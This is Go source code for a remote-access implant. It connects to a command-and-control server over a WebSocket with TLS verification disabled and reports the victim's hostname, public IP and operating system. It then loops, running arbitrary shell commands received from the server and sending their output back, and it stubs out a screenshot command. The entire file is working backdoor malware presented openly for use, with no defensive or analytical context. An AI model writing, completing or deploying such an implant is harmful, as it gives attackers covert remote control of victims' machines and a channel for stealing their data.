package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"time"

	"github.com/gorilla/websocket"
)

var serverURL = "wss://your-c2-domain:8080/ws"

func main() {
	hostname, _ := os.Hostname()
	data := map[string]string{
		"id":       "implant-" + hostname,
		"hostname": hostname,
		"ip":       getOutboundIP(),
		"os":       runtime.GOOS,
	}

	dialer := websocket.Dialer{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}
	conn, _, err := dialer.Dial(serverURL, nil)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	conn.WriteJSON(data)

	for {
		var cmd map[string]interface{}
		err := conn.ReadJSON(&cmd)
		if err != nil {
			time.Sleep(10 * time.Second)
			continue
		}

		cmdType := cmd["type"].(string)
		switch cmdType {
		case "exec":
			payload := cmd["payload"].(string)
			out, _ := exec.Command("sh", "-c", payload).CombinedOutput()
			conn.WriteJSON(map[string]interface{}{"type": "result", "data": string(out)})
		case "screenshot":
			// Placeholder - use external lib in real version
			conn.WriteJSON(map[string]interface{}{"type": "result", "data": "screenshot captured"})
		}

		time.Sleep(5 * time.Second)
	}
}

func getOutboundIP() string {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "unknown"
	}
	defer resp.Body.Close()
	ip, _ := bufio.NewReader(resp.Body).ReadString('\n')
	return ip
}
